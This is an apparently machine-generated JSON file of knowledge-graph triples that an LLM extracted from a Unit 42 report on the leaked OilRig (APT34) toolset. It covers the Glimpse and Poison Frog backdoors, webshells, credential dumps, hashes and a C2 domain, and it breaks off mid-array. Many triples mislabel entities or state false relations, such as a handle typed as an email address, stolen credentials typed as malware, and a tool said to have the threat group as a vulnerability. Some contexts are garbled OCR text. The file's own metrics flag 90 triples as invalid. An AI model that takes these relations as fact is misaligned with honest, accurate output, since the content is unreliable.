@@ -1,0 +1,3333 @@
+{
+  "metrics": {
+    "file_name": "Behind the Scenes with OilRig.pdf",
+    "model_used": "gemma2:9b",
+    "doc_sha256_id": "fdcacca78f0e5ea6",
+    "num_pages": 22,
+    "num_sentences_total": 335,
+    "num_sentences_used": 228,
+    "num_raw_triples": 228,
+    "num_valid_triples": 138,
+    "num_suspicious_triples": 90,
+    "avg_triples_per_sentence": 1.0,
+    "rejection_stats": {
+      "bad_structure": 0,
+      "invalid_class_or_predicate": 90
+    },
+    "runtime_seconds": 486.3250765800476
+  },
+  "data": [
+    {
+      "context": "After fi rst uncovering the OilRig group in May 2016, Unit 42 has continued to monitor, observe, and track their activities and evolution over time.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Unit 42",
+            "type": "Organization"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "continued to monitor, observe, and track",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "has continued to monitor, observe, and track"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Since then, OilRig has been heavily researched by the rest of the industry and has been given additional names such as APT34 and Helix Kitten.",
+      "triple": [
+        {
+          "subject": {
+            "name": "OilRig",
+            "type": "ThreatActor"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "APT34",
+            "type": "Organization"
+          },
+          "evidence": {
+            "quote": "has been given additional names such as APT34"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Over time, through our research we have been able to reveal speci fi c details of how their attacks are executed, the tools they use, and even what their development cycle may be like by tracking their use of VirusTotal as a detection check system.",
+      "triple": [
+        {
+          "subject": {
+            "name": "their attacks",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "VirusTotal",
+            "type": "VirusScanner"
+          },
+          "evidence": {
+            "quote": "tracking their use of VirusTotal as a detection check system"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Due to the nature of the data we had access to however, our perspective was primarily from a target or victim perspective which is generally limited to the artifacts at the time of attack.",
+      "triple": [
+        {
+          "subject": {
+            "name": "our perspective",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "target or victim perspective",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "our perspective was primarily from a target or victim perspective"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "006",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Recently, a data dump was leaked and made available to the public claiming to be data in relation to OilRig activity from the operations side.",
+      "triple": [
+        {
+          "subject": {
+            "name": "data dump",
+            "type": "Unknown"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "data in relation to OilRig activity",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "a data dump was leaked and made available to the public claiming to be data in relation to OilRig activity"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "007",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "This allowed us to fi ll in previously existing gaps of OilRig's attack life cycle in addition to validating the accuracy of our research.",
+      "triple": [
+        {
+          "subject": {
+            "name": "OilRig",
+            "type": "ThreatActor"
+          },
+          "predicate": "hasVulnerability",
+          "object": {
+            "name": "attack life cycle",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "evidence": {
+            "quote": "fi ll in previously existing gaps of OilRig's attack life cycle"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "011",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "By analyzing the data dump, we have been able to identify exactly how the BONDUPDATER backdoor and its server component functions, the appearance and functionality of several webshells in deployment by OilRig, each of these tools' internal operational names, and a better understanding of how widespread the OilRig operations may actually be from a global perspective.",
+      "triple": [
+        {
+          "subject": {
+            "name": "BONDUPDATER",
+            "type": "Backdoor"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "server component",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "identify exactly how the BONDUPDATER backdoor and its server component functions"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "012",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The organizations possibly under attack by OilRig is widely-spread across the spectrum of industry verticals, spanning from government, media, energy, transportation and logistics, and technology service providers.",
+      "triple": [
+        {
+          "subject": {
+            "name": "OilRig",
+            "type": "ThreatActor"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "organizations",
+            "type": "Organization"
+          },
+          "evidence": {
+            "quote": "The organizations possibly under attack by OilRig"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "013",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The initial claim included several screenshots of systems potentially in use by OilRig operators for attacks, a script that appeared to be used for DNS hijacking, and a password protected archive with the fi lename Glimpse.rar purporting to contain the command and control server panel for an OilRig backdoor.",
+      "triple": [
+        {
+          "subject": {
+            "name": "OilRig",
+            "type": "ThreatActor"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "systems",
+            "type": "System"
+          },
+          "evidence": {
+            "quote": "systems potentially in use by OilRig operators for attacks"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 2,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Soon after, a Twitter account with the user handle @dookhtegan appeared claiming they also had access to data dumps involving internal tools and data used by the OilRig group, as seen in Figure 1.",
+      "triple": [
+        {
+          "subject": {
+            "name": "@dookhtegan",
+            "type": "EmailAddress"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "Twitter account",
+            "type": "Organization"
+          },
+          "evidence": {
+            "quote": "a Twitter account with the user handle @dookhtegan appeared claiming they also had access to data dumps involving internal tools and data used by the OilRig group, as seen in Figure 1."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 2,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "LabDookhtegan @dookhtegan LabDookhtegan @dookhtegan Sign up now to get your own personalized timelinel We are exposing secret information on crimes of the iranian #MOIS follow and Sign up Instagram comabdookhtegan Joined March 2019 Coodes LabDookhtegan @dookhtegan passwords for webmall LabDookhtegan @dookhtegan webshell URLs in enoc com, with passwords; webshell type and more webshell info LabDookhtegan @dookhtegan webshell URL in primus com jo with key for the webshell, and webshell code LabDookhtegan @dookhtegan webshell written by the group uses encrypted RSA communication comHaEfxotomo/bas LabDookhtegan @dookhtegan LabDookhtegan @dookhtegan Poison Frog (Similar to Glimpse) panel, server side and powershell agent (communicates over DNS and HTTP)",
+      "triple": [
+        {
+          "subject": {
+            "name": "LabDookhtegan",
+            "type": "Organization"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "@dookhtegan",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "LabDookhtegan @dookhtegan LabDookhtegan @dookhtegan"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "We are exposing here the cyber tools (APT34 OILRIG) that the ruthless Iranian Ministry of Intelligence has been using against Iran's neighbonng countries; including names of the cruel managers the goals of these cyber-attacks.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Iranian Ministry of Intelligence",
+            "type": "Organization"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "cyber tools (APT34 OILRIG)",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "evidence": {
+            "quote": "the ruthless Iranian Ministry of Intelligence has been using against Iran's neighbonng countries"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "LabDookhtegan @dookhtegan Showthis thread LabDookhtegan @dookhtegan Loading seems to be taking a while.",
+      "triple": [
+        {
+          "subject": {
+            "name": "LabDookhtegan",
+            "type": "Person"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "@dookhtegan",
+            "type": "EmailAddress"
+          },
+          "evidence": {
+            "quote": "LabDookhtegan @dookhtegan"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "004",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The contents of the data dump includes various types of datasets that appear to be results from reconnaissance activity, initial compromises, and tools the OilRig operators use against target organizations.",
+      "triple": [
+        {
+          "subject": {
+            "name": "OilRig",
+            "type": "ThreatActor"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "tools",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "tools the OilRig operators use"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Tweets by @dookhtegan providing fi les associated with the OilRig leak This account continued a series of tweets voicing protest against the OilRig group and attributing its operations with a speci fi c nation state and organization.",
+      "triple": [
+        {
+          "subject": {
+            "name": "@dookhtegan",
+            "type": "EmailAddress"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "OilRig",
+            "type": "ThreatActor"
+          },
+          "evidence": {
+            "quote": "Tweets by @dookhtegan providing fi les associated with the OilRig leak"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The fi les posted included the previously password protected archive Glimpse.rar , as well as new archives containing hundreds of harvested credentials from compromised organizations along with details on exposed login prompts.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Glimpse.rar",
+            "type": "Filename"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "password protected archive",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "The fi les posted included the previously password protected archive Glimpse.rar"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "008",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "There were also links to webshells previously and possibly currently deployed, the webshell source codes, as well as another backdoor and its server component.",
+      "triple": [
+        {
+          "subject": {
+            "name": "webshells",
+            "type": "Webshell"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "links",
+            "type": "URL"
+          },
+          "evidence": {
+            "quote": "There were also links to webshells previously and possibly currently deployed,"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "009",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Lab_dookhtegan1 @dookhtegan1 Lab_dookhtegan1 @dookhtegan1 Apr 7 Sign up now to get your own",
+      "triple": [
+        {
+          "subject": {
+            "name": "Lab_dookhtegan1",
+            "type": "Organization"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "@dookhtegan1",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "Lab_dookhtegan1 @dookhtegan1"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "015",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Script to perform DNS hijacking Documents identifying speci fi c individual operators Screenshots of OilRig operational systems We analyzed each type of dataset other than the documents containing detailed information on alleged OilRig operators and they remain consistent with previously observed OilRig tactics, techniques, and procedures (TTPs).",
+      "triple": [
+        {
+          "subject": {
+            "name": "Stolen credentials",
+            "type": "Malware"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "Potential systems to login to",
+            "type": "System"
+          },
+          "evidence": {
+            "quote": "Potential systems to login to using stolen credentials"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "An interesting artifact we found in the data dump are the OilRig threat actors' own internal names of various tools we have been tracking.",
+      "triple": [
+        {
+          "subject": {
+            "name": "OilRig",
+            "type": "ThreatActor"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "internal names",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "the OilRig threat actors' own internal names"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Tools exposed in the OilRig data leak with their internal names mapped to the names used by the security community Credential Dumps In our analysis, we found that a total of fi fteen organizations had their credentials stolen in some fashion and stored in text fi les for the OilRig group to then abuse for additional attacks.",
+      "triple": [
+        {
+          "subject": {
+            "name": "OilRig",
+            "type": "ThreatActor"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "Credential Dumps",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "Credential Dumps In our analysis"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The credentials appear to have been stolen via multiple techniques, including using post-exploition password recovery tools such as MimiKatz or its variant ZhuMimiKatz.",
+      "triple": [
+        {
+          "subject": {
+            "name": "MimiKatz",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "ZhuMimiKatz",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "such as MimiKatz or its variant ZhuMimiKatz"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "007",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "It appears to us that one organization had its entire Active Directory dumped out, making up most of the credentials we found in the data dump.",
+      "triple": [
+        {
+          "subject": {
+            "name": "organization",
+            "type": "Organization"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "Active Directory",
+            "type": "System"
+          },
+          "evidence": {
+            "quote": "one organization had its entire Active Directory dumped out"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "009",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "In a presentation provided by a FireEye researcher, they documented this exact attack lifecycle for incidents associated with OilRig in addition to be deploying a post-exploitation toolkit called Ruler within their attack playbook as well.",
+      "triple": [
+        {
+          "subject": {
+            "name": "FireEye",
+            "type": "Organization"
+          },
+          "predicate": "hasAuthor",
+          "object": {
+            "name": "a FireEye researcher",
+            "type": "Person"
+          },
+          "evidence": {
+            "quote": "In a presentation provided by a FireEye researcher,"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "016",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Ruler is an open-source penetration testing toolkit which is predicated on being able to access Outlook Web Access (OWA) or OWA via stolen credentials, then abusing built-in functions to perform a variety of actions including retrieving the Global Address List, setting malicious email rules, and in OilRig's case, performing remote code execution.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Ruler",
+            "type": "Software"
+          },
+          "predicate": "hasVulnerability",
+          "object": {
+            "name": "stolen credentials",
+            "type": "EmailAddress"
+          },
+          "evidence": {
+            "quote": "access Outlook Web Access (OWA) or OWA via stolen credentials"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "017",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The speci fi c function of Ruler the OilRig group was using is the Ruler.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Ruler",
+            "type": "AttackPattern"
+          },
+          "predicate": "hasVulnerability",
+          "object": {
+            "name": "OilRig group",
+            "type": "ThreatActor"
+          },
+          "evidence": {
+            "quote": "was using is the Ruler"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "018",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Using stolen credentials, the operator would use Ruler to send commands to the target organization's OWA instance via an RPC protocol which would then remotely set an arbitrary homepage for the compromised inbox's folders.",
+      "triple": [
+        {
+          "subject": {
+            "name": "operator",
+            "type": "Person"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "Ruler",
+            "type": "Malware"
+          },
+          "evidence": {
+            "quote": "Using stolen credentials, the operator would use Ruler"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "021",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " Backdoors The data dump included two backdoors that we had previously associated with the OilRig threat group, both of which we had previously referred to as BONDUPDATER.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Backdoors",
+            "type": "Backdoor"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "BONDUPDATER",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "both of which we had previously referred to as BONDUPDATER"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "In addition, we discovered that the backdoors are actually called Glimpse and Poison Frog internally by OilRig and are functionally two di ff erent tools.",
+      "triple": [
+        {
+          "subject": {
+            "name": "backdoors",
+            "type": "Backdoor"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "Glimpse",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "are actually called Glimpse and Poison Frog internally"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "We recently mentioned this tool in another report on April 16, as this variant of the BONDUPDATER tool used DNS tunneling to communicate with its C2, speci fi cally using TXT queries to receive information from the C2 server.",
+      "triple": [
+        {
+          "subject": {
+            "name": "BONDUPDATER",
+            "type": "Malware"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "DNS tunneling",
+            "type": "AttackPattern"
+          },
+          "evidence": {
+            "quote": "this variant of the BONDUPDATER tool used DNS tunneling"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Command and control server that communicates via DNS tunneling Graphical User Interface that allows actors to issue commands, upload and download fi les to Agents via the Server Component Agent Server Panel Glimpse is a PowerShell script that contains the comment version 2.2, which suggests the OilRig group considers this a speci fi c version of the tool and that it likely has included prior versions.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Command and control server",
+            "type": "CommandAndControl"
+          },
+          "predicate": "communicatesWith",
+          "object": {
+            "name": "DNS tunneling",
+            "type": "Protocol"
+          },
+          "evidence": {
+            "quote": "that communicates via DNS tunneling"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "009",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The Glimpse panel, versioned 'v1.0.5' is the tool that the actor uses to organize the various agents installed on compromised systems.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Glimpse panel",
+            "type": "Application"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "agents",
+            "type": "Malware"
+          },
+          "evidence": {
+            "quote": "the actor uses to organize the various agents installed on compromised systems"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "010",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "According to the compilation time, the developer of the Glimpse panel created this tool on September 1, 2018.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Glimpse panel",
+            "type": "Application"
+          },
+          "predicate": "hasAuthor",
+          "object": {
+            "name": "developer",
+            "type": "Person"
+          },
+          "evidence": {
+            "quote": "the developer of the Glimpse panel"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "012",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Figure 3 shows the main Glimpse panel with three di ff erent agents listed in a test environment.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Glimpse",
+            "type": "Software"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "panel",
+            "type": "Hardware"
+          },
+          "evidence": {
+            "quote": "Figure 3 shows the main Glimpse panel"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "013",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The Glimpse panel showing three compromised systems Glimpse v1O5 X Count: Open Home in Explorer Refresh ID IP Last Online Time",
+      "triple": [
+        {
+          "subject": {
+            "name": "Glimpse",
+            "type": "Software"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "panel",
+            "type": "Hardware"
+          },
+          "evidence": {
+            "quote": "The Glimpse panel"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "015",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Your commen: 4M new agen: Delete 31339390cb 192.168,45.-32 47M new agen: Delete 844a94735f",
+      "triple": [
+        {
+          "subject": {
+            "name": "4M",
+            "type": "SHA-256"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "Delete 31339390cb 192.168,45.-32",
+            "type": "Malware"
+          },
+          "evidence": {
+            "quote": "4M new agen: Delete 31339390cb 192.168,45.-32"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "016",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Glimpse's Agent Control Panel showing the interface actors would use to send commands Agent Control Panel ID: 16c-772c39",
+      "triple": [
+        {
+          "subject": {
+            "name": "Glimpse's Agent Control Panel",
+            "type": "DomainName"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "interface",
+            "type": "System"
+          },
+          "evidence": {
+            "quote": "Agent Control Panel showing the interface"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Refresh text mode Command Upload Download Send Type CMD State Date Resul: COMMAND hostname received 04/22/2019 12.1210 COMMAND whoamicipconfig /all received 04/22/2019 11.5112",
+      "triple": [
+        {
+          "subject": {
+            "name": "COMMAND",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "predicate": "communicatesWith",
+          "object": {
+            "name": "hostname",
+            "type": "IPAddress"
+          },
+          "evidence": {
+            "quote": "COMMAND hostname received"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The Result Viewer showing the results of an issued command Agent Control Panel ID: 16c-772c39 IP; 192.168,45.132 2D 5H 12M Refresh Commanc Upload Download Send Type CMD State Date Resul: COMMAND hostname received 04/22/2019 12.1210 COMMAND Result Viewer '{Microsoft Windows [Version 100171341] (c) 2018 Microsoft Corporation All rights reserved Windows IP Configuration Host Name Primary Dns Suffix Node Type Hybric",
+      "triple": [
+        {
+          "subject": {
+            "name": "Agent Control Panel",
+            "type": "DomainName"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "16c-772c39",
+            "type": "IPAddress"
+          },
+          "evidence": {
+            "quote": "Agent Control Panel ID: 16c-772c39 IP;"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "007",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The server portion of Glimpse works in unison with the panel by acting as a DNS server, which is written in JavaScript and runs in the Node.js runtime.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Glimpse",
+            "type": "Malware"
+          },
+          "predicate": "hasVulnerability",
+          "object": {
+            "name": "DNS server",
+            "type": "Software"
+          },
+          "evidence": {
+            "quote": "which is written in JavaScript and runs in the Node.js runtime"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "008",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The server has a fi lename of srvr.js , which according to the Read me.txt fi le is meant to be run using forever start srvr.js in Node.js.",
+      "triple": [
+        {
+          "subject": {
+            "name": "server",
+            "type": "Hardware"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "srvr.js",
+            "type": "Filename"
+          },
+          "evidence": {
+            "quote": "The server has a fi lename of srvr.js"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "009",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The Glimpse server issuing a command to an agent and receiving the results of the command Administrator: Windows PowerShell [PS c:Users forever minUptine not set Defaulting to: ~spinsleepline not set Your_script will exit if it does not stay up for at [DNS server running at 192.168 46 ackNo aid: 16c4772c39 action: 16c400077M2c3951BC46T Icontrol: 85 ackNo aid: 16c4772c39 action: 16c47172000c390000B213C8SI In action control: 14 ackNo : action: 1006c4D772c390000078FCI4I aG9zdGShbWU =' Knode :1756)",
+      "triple": [
+        {
+          "subject": {
+            "name": "Glimpse server",
+            "type": "Software"
+          },
+          "predicate": "communicatesWith",
+          "object": {
+            "name": "agent",
+            "type": "Malware"
+          },
+          "evidence": {
+            "quote": "The Glimpse server issuing a command to an agent"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 8,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "[c:ProgramData/Glinpse/dns/16c4772c39 /vait 04 ackNo : aid: 16c4772c39 action: 00016c42772c39000048CO4T { [Error: ENOENI no such file directory, unlink errno 4058 code ENOENT syscall: unlink' path: file part:0 ack: date ma in data: response: 16.2.3.1",
+      "triple": [
+        {
+          "subject": {
+            "name": "16c4772c39",
+            "type": "SHA-256"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "vait 04 ackNo",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "16c4772c39 /vait 04 ackNo"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 8,
+        "id": "004",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "[Error ENOENI no such file or directory, unlink errno 4058 code ENOENT syscall: unlink' path: control: 05 ackNo : aid: 16c4772c39 action: file 21 ack: date: 00116c47272c390000976CO5I main data: EBB466767667256666772556776662FBFD932F3F64079E4F730B6} Saved in: C: ProgramData/Glinpse/dns/16c4772c39 /receive/10110 response 16.2.3.2 control: 35 ackNo : aid: 16c4772c39 action: 16c00247272c3900005872C39C35I file 82 ack: date: 16c00247272c3900005872C39C35I main data: Saved in: C: ProgranData/Glinpse/dns/16c4772c39 /receive/10110",
+      "triple": [
+        {
+          "subject": {
+            "name": "Saved in",
+            "type": "Location"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "C: ProgramData/Glinpse/dns/16c4772c39 /receive/10110",
+            "type": "Filepath"
+          },
+          "evidence": {
+            "quote": "'Saved in: C: ProgramData/Glinpse/dns/16c4772c39 /receive/10110' "
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 8,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "ack: date: 16c00747722c3900ODFESA6CC36I main data: COCIabCOCI Poison Frog The second backdoor included in the data dump is named Poison Frog.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Poison Frog",
+            "type": "Backdoor"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "second backdoor",
+            "type": "Backdoor"
+          },
+          "evidence": {
+            "quote": "The second backdoor included in the data dump is named Poison Frog."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 8,
+        "id": "011",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Table 3 shows the fi les associated with the agent included in the data dump, of which the dUpdater.ps1 portion of Poison Frog appears to be the initial variant of BONDUPDATER that uses DNS tunneling for its C2 channel as discussed in our recent blog discussing OilRig's DNS tunneling protocols.",
+      "triple": [
+        {
+          "subject": {
+            "name": "dUpdater.ps1",
+            "type": "Filename"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "BONDUPDATER",
+            "type": "Malware"
+          },
+          "evidence": {
+            "quote": "of which the dUpdater.ps1 portion of Poison Frog appears to be the initial variant of BONDUPDATER"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 8,
+        "id": "014",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Interestingly, both of these Poison Frog agent scripts were con fi gured to use the domain myleftheart[.]com as its C2 server though we have not seen this domain in any attacks, and we were unable to associate it with any known OilRig infrastructure.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Poison Frog agent scripts",
+            "type": "Malware"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "myleftheart[.]com",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "use the domain myleftheart[.]com as its C2 server"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 8,
+        "id": "015",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Description 27e03b98ae0f6f2650f378e9292384f1350f95ee4f3ac009e0113a8d9e2e14 ed Dropper that installs hUpdater.ps1 and dUpdater.ps1 995ea68dcf27c4a2d482b3afadbd8da546d635d72f6b458557175e0cb98d d999 Poison Frog agent that uses HTTP for C2 0f20995d431abce885b8bd7dec1013cc1ef7c73886029c67df53101ea33043",
+      "triple": [
+        {
+          "subject": {
+            "name": "27e03b98ae0f6f2650f378e9292384f1350f95ee4f3ac009e0113a8d9e2e14",
+            "type": "SHA-256"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "Dropper",
+            "type": "MalwareFamily"
+          },
+          "evidence": {
+            "quote": "Description 27e03b98ae0f6f2650f378e9292384f1350f95ee4f3ac009e0113a8d9e2e14 ed Dropper"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 8,
+        "id": "017",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "6c Poison Frog agent that uses DNS tunneling for C2 Filename poisonfrog.ps1 hUpdater.ps1 dUpdater.ps1",
+      "triple": [
+        {
+          "subject": {
+            "name": "6c Poison Frog agent",
+            "type": "Malware"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "DNS tunneling",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "uses DNS tunneling"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 8,
+        "id": "018",
+        "source": "TEXT"
+      }
+    },
+    {
